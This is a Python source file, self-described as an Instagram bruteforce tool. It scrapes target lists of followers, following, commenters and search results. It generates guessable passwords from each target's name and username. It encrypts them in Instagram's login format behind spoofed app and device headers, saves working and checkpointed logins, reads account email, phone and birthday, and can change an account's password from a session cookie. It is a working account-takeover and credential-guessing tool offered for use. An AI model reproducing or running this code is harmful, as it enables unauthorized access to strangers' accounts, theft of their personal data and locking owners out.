#!/usr/bin/env python

"""
Software instagram bruteforce
Copyright (c) 2023-2025 ELite3 developers (https://github.com/khamdihi-dev)
"""

import re, json, base64, sys, requests, httpx, string, random, time, uuid, hashlib, urllib, time
import urllib.parse

from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.Random import get_random_bytes
from datetime import datetime

dumpdata = []

class account:
    
    def __init__(self, cookie):
        self.cookie = cookie

    def Log(self, message, exit_ = False):
        print(f'[LOG] {message}')
        if exit_:sys.exit(1)

    def authorization(self):
        try:
            self.id = re.search(r'ds_user_id=(\d+);',str(self.cookie)).group(1)
            self.sn = re.search(r'sessionid=(.*?);',str(self.cookie)).group(1)
            self.br = base64.b64encode(json.dumps({'ds_user_id': self.id, 'sessionid': self.sn}).encode()).decode()
            return self.id, self.br
        except AttributeError:
            self.Log('Pastikan cookie kamu aktif!')

    def users_info(self):
        try:
            self.ds_users_id, self.bearer_token = self.authorization()
            self.headers = {
                'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                'accept-language': 'id-ID, en-US',
                'authorization': f'Bearer IGT:2:{self.bearer_token}',
            }
            self.respon = requests.get(f'https://i.instagram.com/api/v1/users/{self.ds_users_id}/info/', headers=self.headers).json()['user']
            self.username = self.respon['username']
            self.fullname = self.respon['full_name']
            self.follower = self.respon['follower_count']
            self.following = self.respon['following_count']
            self.postingan = self.respon['media_count']
            return self.username, self.fullname, self.follower, self.following, self.postingan

        except KeyError: self.Log('Cookie kamu kadarluarsa nih, coba ambil lagi')
        except requests.exceptions.ConnectionError: self.Log('Jaringan kamu bermasalah nih!',True)
    
    def friends_user_chek(self, username):
        try:
            zsta = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}).json()['data']['user']
            ig_followers_user = zsta['edge_followed_by']['count']
            ig_following_user = zsta['edge_follow']['count']
            ig_feed_post = zsta['edge_owner_to_timeline_media']['count']
        except Exception as e:
            ig_followers_user = ''
            ig_following_user = ''
            ig_feed_post = ''
        return ig_followers_user, ig_following_user, ig_feed_post
    
    def ProfileInfo(self, uid, username):
        try:
            ig_form_headers = {
                'accept': '*/*',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/accounts/edit/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Chromium";v="136", "Microsoft Edge";v="136", "Not.A/Brand";v="99"',
                'sec-ch-ua-full-version-list': '"Chromium";v="136.0.7103.49", "Microsoft Edge";v="136.0.3240.50", "Not.A/Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
                'x-asbd-id': '359341',
                'x-csrftoken': re.findall('csrftoken=(.*?);',self.cookie)[0],
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR1ckJCv85oNbsp8_IPD4KWujGUkcMfLlKMcTMJu0aWMgoDW',
                'x-requested-with': 'XMLHttpRequest',
                'x-web-session-id': 'iuskow:vsbcef:6tkd9l',
                'cookie': self.cookie,
            }
            ig_respon = requests.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/',headers=ig_form_headers).json()['form_data']
            ig_first_name = ig_respon['first_name']
            ig_phone_number = ig_respon['phone_number']
            ig_user_birthday = ig_respon['birthday']
            ig_user_bio = ig_respon['biography']
            ig_user_email = ig_respon['email']

        except Exception as e:
            ig_first_name = ''
            ig_phone_number = ''
            ig_user_birthday = ''
            ig_user_bio = ''
            ig_user_email = ''
            
        ig_followes_user, ig_following_user, ig_feedpost = self.friends_user_chek(username)
        return ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_user_email, ig_feedpost

# --[ Convert and scrapping data ]
class convert:
    def __init__(self, cookie):
        self.cokie = cookie

    def usernametoid(self, username):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '673'
                })
                self.req = self.r.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
                return self.req
            except:return None
    
    def media_id(self, posts_url):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 361.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '673'
                })
                self.req1 = self.r.get(posts_url).text
                self.mid = re.search('{"media_id":"(.*?)"',str(self.req1)).group(1)
                return self.mid
            except AttributeError:return None

# --[ Ambil data target ]
class dump:
    def __init__(self, cookie):
        self.cokie = cookie

    def followers(self,userid,next_pae):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                })
                self.data = {"query_hash": "c76146de99bb02f6415203be841dd25a","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                for self.users in self.req['data']['user']['edge_followed_by']['edges']:
                    self.udata = self.users['node']['id'] + '<=>' + self.users['node']['username'] + '<=>' + self.users['node']['full_name']
                    if self.udata not in dumpdata:
                        dumpdata.append(self.udata)
                    print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                if(self.req['data']['user']['edge_followed_by']['page_info']['has_next_page']==True):
                    self.followers(userid, self.req['data']['user']['edge_followed_by']['page_info']['end_cursor'])
                else: return
            except:return
        return dumpdata
    
    def following(self,userid,next_pae):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                })
                self.data = {"query_hash": "d04b0a864b4b54837c0d870b0e77e076","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                for self.users in self.req['data']['user']['edge_follow']['edges']:
                    self.udata = self.users['node']['id'] + '<=>' + self.users['node']['username'] + '<=>' + self.users['node']['full_name']
                    if self.udata not in dumpdata:
                        dumpdata.append(self.udata)
                    print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                if(self.req['data']['user']['edge_follow']['page_info']['has_next_page']==True):
                    self.following(userid, self.req['data']['user']['edge_follow']['page_info']['end_cursor'])
            except:return
        return dumpdata
    
    def komentar(self, media_id, min_cursor):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '1358',
                })
                self.req = self.r.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                for self.usr in self.req['comments']:
                    self.users = self.usr['user']
                    self.udata = self.users['id'] + '<=>' + self.users['username'] + '<=>' + self.users['full_name']                    
                    if self.udata not in dumpdata:
                        dumpdata.append(self.udata)
                    print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                self.abc = self.req['next_min_id']
                self.komentar(media_id, self.abc)
            except: return
        return dumpdata
    
    def search_people(self, name):
        nama = name.copy()
        while True:
            try:
                zhfa = random.choice(nama)
                response = requests.get(
                    url=f'https://i.instagram.com/api/v1/fbsearch/account_serp/?search_surface=user_serp&timezone_offset={-time.timezone}&count=150&query={zhfa}',
                    headers={'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',"Accept-Language": "id-ID","X-ASBD-ID": "198387","X-CSRFToken": re.findall("csrftoken=(.*?);", self.cokie)[0],"X-IG-App-ID": "1217981644879628","X-Requested-With": "XMLHttpRequest","Cookie": self.cokie
                }).json()
                for data_people in response['users']:
                    data = data_people['pk']+'<=>'+data_people['username']+'<=>'+data_people['full_name']
                    if data not in dumpdata:
                        print(data)
                        dumpdata.append(data)
                    rin4 = data_people['full_name'].split(' ')[0]
                    if rin4 not in nama:nama.append(rin4)
            except (KeyboardInterrupt,KeyError):
                break
        return dumpdata


# --[ Ganti kata sandi ]
class change:
    def __init__(self, cookie, sandiOLD, sandiNEW):
        if 'mid' not in cookie or 'csrftoken' not in cookie:
            self.data = self.Shared_Data(cookie)
            self.cookie = self.generate_default_cokie(self.data)
        else:
            self.cookie = cookie
        self.NewPas = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{sandiNEW}'
        self.OldPas = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{sandiOLD}'

    def WebSession(self) -> str:
        self.a = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(6))
        self.b = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(6))
        self.c = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(6))
        return '{}:{}:{}'.format(self.a,self.b,self.c)

    def Shared_Data(self,cookie) -> None:
        try:
            self.headers_Shared = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': cookie,
                'dpr': '1',
                'priority': 'u=0, i',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.84", "Microsoft Edge";v="132.0.2957.115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
                'viewport-width': '1358',
            }
            self.respon = requests.get('https://www.instagram.com/data/shared_data/', headers=self.headers_Shared).json()['config']['csrf_token']
            return cookie + f';csrftoken={self.respon};'
        except Exception as e:
            return cookie + ';csrftoken=NPWtMg1bzwTyBCPicx4x1BnMjt77sLTk;'
        
    def generate_default_cokie(self, coks) -> str:
        self.acak = ''.join(random.choice(string.ascii_lowercase.upper()) for _ in range(6))
        self.mecid = f'Z4FI1wABAAET6tZpG_yS09{self.acak}'
        self.igdid = str(uuid.uuid4())
        self.cokie = f'mid={self.mecid}; ig_did={self.igdid}; datr=lTaDZ1Om4hkRE4wiVFZ7TkPz; ps_l=1; ps_n=1; ig_nrcb=1; wd=1358x688; ' + coks
        return(self.cokie.replace(' ',''))

    def password(self) -> None:
        try:
            self.token = re.findall('csrftoken=(.*?);',self.cookie)
            if len(self.token) == 0:
                self.token = ['NPWtMg1bzwTyBCPicx4x1BnMjt77sLTk']
            self.headers = {
                'accept': '*/*',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': self.cookie,
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/accounts/password/change/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.84", "Microsoft Edge";v="132.0.2957.115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
                'x-asbd-id': '129477',
                'x-csrftoken': self.token[0],
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR1ILcOg1xJ5oN35n4mr2GUs3xvqz00UCJNIwOEwKMiKAp-0',
                'x-instagram-ajax': '1019587826',
                'x-requested-with': 'XMLHttpRequest',
                'x-web-session-id': self.WebSession()
            }
            self.Password_Data = {'enc_old_password': self.OldPas,'enc_new_password1': self.NewPas,'enc_new_password2': self.NewPas}
            self.ChangeRespon = requests.post('https://www.instagram.com/api/v1/web/accounts/password/change/',data=self.Password_Data,headers=self.headers).text
            if 'Kata sandi Anda salah dimasukkan. Harap masukkan kembali.' in self.ChangeRespon or '"status":"fail"' in self.ChangeRespon:
                return False
            elif '"status":"ok"' in self.ChangeRespon:
                return True                
            return False
        except Exception as e:
            return False
            

# --[ Lainnya ]
class Slstya:
    def __init__(self):
        pass

    def simpan_hasil(self, data_json, status_login):
        now = datetime.now()
        fil = f'data/Elite3-OK-{now.day}-{now.month}-{now.year}.json' if status_login is True else f'data/Elite3-CP-{now.day}-{now.month}-{now.year}.json'
        with open(fil,'a') as f:
            f.write(json.dumps(data_json)+'\n')
    
    def BuatSandiOtomatis(self, username: str, nama: str) -> list:
        array_pwd = []
        pasaran_angka = ['123','1234','12345','01','02','03']
        if len(nama) >=6:
            array_pwd.append(nama.lower())
        
        for name in nama.split(' '):
            if len(name) >=3:
                if len(name) >=6:
                    array_pwd.append(name.lower())
                for angka in pasaran_angka:
                    if len(angka) == 2 and len(name) <=3:
                        continue
                    array_pwd.append(name.lower()+str(angka))
        
        if len(username) >=6:
            array_pwd.append(username.replace('_',' ').replace('.',' '))
            array_pwd.append(username)

        username_ = username.replace('.',' ').replace('_',' ').split(' ')
        for _user in username_:
            if len(_user) >=3:
                for angka in pasaran_angka:
                    if len(_user) <=3 and len(angka) == 2:
                        continue
                    array_pwd.append(_user+str(angka))

        return list(set(array_pwd))
    
    def create_android_id(self, seed:str) -> str:
        hashing = hashlib.md5()
        hashing.update(seed.encode('utf-8'))
        dev = uuid.UUID(hashing.hexdigest())
        return 'android-{}'.format(dev.hex[:16])
    
    def create_device_id(self) -> str: return str(uuid.uuid4())
    def create_family_device_id(self) -> str: return str(uuid.uuid4())
    def create_client_connection(self) -> str: return str(uuid.uuid4().hex)
    def create_timezone(self) -> str: return str(-time.timezone)
    def create_pigeon(self) -> str: return str(time.time())[:14]
    def create_pigeon_session(self) -> str: return str(uuid.uuid4())
    def create_signature_bloks(self, params, client_bk, bk_id) -> str:
        params_ = urllib.parse.quote(json.dumps(params))
        client_bk_ = urllib.parse.quote(json.dumps(client_bk))
        return f'params={params_}&bk_client_context={client_bk_}&bloks_versioning_id={bk_id}'
    
    def encrypt_password(self, password: str = None, timestamp: str = None, public_key: str = None, public_key_id: int = None):
        iv = get_random_bytes(12)
        session_key = get_random_bytes(32)
        public_key_id = public_key_id or 41
        timestamp = timestamp if timestamp is not None else str(time.time())[:10]
        recipient_key = RSA.import_key(public_key if public_key is not None else '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvcu1KMDR1vzuBr9iYKW8\nKWmhT8CVUBRkchiO8861H7zIOYRwkQrkeHA+0mkBo3Ly1PiLXDkbKQZyeqZbspke\n4e7WgFNwT23jHfRMV/cNPxjPEy4kxNEbzLET6GlWepGdXFhzHfnS1PinGQzj0ZOU\nZM3pQjgGRL9fAf8brt1ewhQ5XtpvKFdPyQq5BkeFEDKoInDsC/yKDWRAx2twgPFr\nCYUzAB8/yXuL30ErTHT79bt3yTnv1fRtE19tROIlBuqruwSBk9gGq/LuvSECgsl5\nz4VcpHXhgZt6MhrAj6y9vAAxO2RVrt0Mq4OY4HgyYz9Wlr1vAxXXGAAYIvrhAYLP\n7QIDAQAB\n-----END PUBLIC KEY-----\n')
        cipher_rsa = PKCS1_v1_5.new(recipient_key)
        rsa_encrypted = cipher_rsa.encrypt(session_key)
        cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
        cipher_aes.update(timestamp.encode())
        aes_encrypted, tag = cipher_aes.encrypt_and_digest(password.encode('utf-8'))
        size_buffer = len(rsa_encrypted).to_bytes(2, byteorder='little')
        payload = base64.b64encode(b''.join([b'\x01',public_key_id.to_bytes(1, byteorder='big'),iv,size_buffer,rsa_encrypted,tag,aes_encrypted]))
        return f'#PWD_INSTAGRAM:1:{timestamp}:{payload.decode()}'

    def instagram_default(self):
        return {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ig-intended-user-id": "0",
            "priority": "u=3",
            "x-bloks-is-layout-rtl": "false",
            "x-bloks-prism-button-version": "CONTROL",
            "x-bloks-prism-colors-enabled": "false",
            "x-bloks-prism-font-enabled": "false",
            "x-bloks-prism-indigo-link-version": "0",
            "x-bloks-version-id": "d1e4aec4c37d352877c9c5a8560296d85f8a24301a44836fcf88c72dc969c3a1",
            "x-fb-client-ip": "True",
            "x-fb-connection-type": "WIFI",
            "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/",
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
            "x-fb-server-cluster": "True",
            "x-ig-android-id": "android-00159caa5a8c5dcf",
            "x-ig-app-id": "567067343352427",
            "x-ig-app-locale": "in_ID",
            "x-ig-attest-params": '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"9aEdPhIfQr6moTbWDOjJ42e8XNlApwZH","signed_nonce":"","key_hash":""}]}',
            "x-ig-bandwidth-speed-kbps": "-1.000",
            "x-ig-bandwidth-totalbytes-b": "0",
            "x-ig-bandwidth-totaltime-ms": "0",
            "x-ig-client-endpoint": "com.bloks.www.caa.login.login_homepage",
            "x-ig-capabilities": "3brTv10=",
            "x-ig-connection-type": "WIFI",
            "x-ig-device-id": "1c09c7ed-3663-447e-b6be-2c331f571ce5",
            "x-ig-device-locale": "in_ID",
            "x-ig-family-device-id": "7e744a2d-0dc2-4fb3-841e-983943d0fe35",
            "x-ig-mapped-locale": "id_ID",
            "x-ig-nav-chain": "com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:1751129468.218::",
            "x-ig-timezone-offset": "28800",
            "x-ig-www-claim": "0",
            "x-mid": "aF-68wABAAGGzuqBjQbXeDXbKl9o",
            "x-pigeon-rawclienttime": "1751129512.735",
            "x-pigeon-session-id": "UFS-019d542a-c69d-4009-85f1-8148b57c48a3-0",
            "x-tigon-is-retry": "False",
            "x-zero-balance": "",
            "x-zero-eh": "IG0e09d776530888418ab70f3822fbb4e1",
            "user-agent": "Instagram 384.0.0.46.83 Android (28/9; 255dpi; 768x1366; Asus; ASUS_Z01QD; ASUS_Z01QD; intel; in_ID; 746325164)",
            "x-fb-conn-uuid-client": "f60a1d29bb3de9bbaf9235dea9291557",
            "x-fb-http-engine": "Tigon/MNS/TCP"
        }



def random_mid(prefix='aF',length=26):
    chars = string.ascii_letters + string.digits + "-_"
    return prefix + ''.join(random.choices(chars, k=length))

def random_text_input(length):
    chars = ''.join(random.choices(string.ascii_lowercase,k=length))
    return chars

def generate_instagram_cookie():
    def random_token(length):
        chars = string.ascii_letters + string.digits + "_"
        return ''.join(random.choices(chars, k=length))

    def random_mid(length=26):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))

    csrftoken = random_token(22)
    ig_did = str(uuid.uuid4()).upper()
    mid = random_mid()
    return f"csrftoken={csrftoken};ig_did={ig_did};mid={mid};"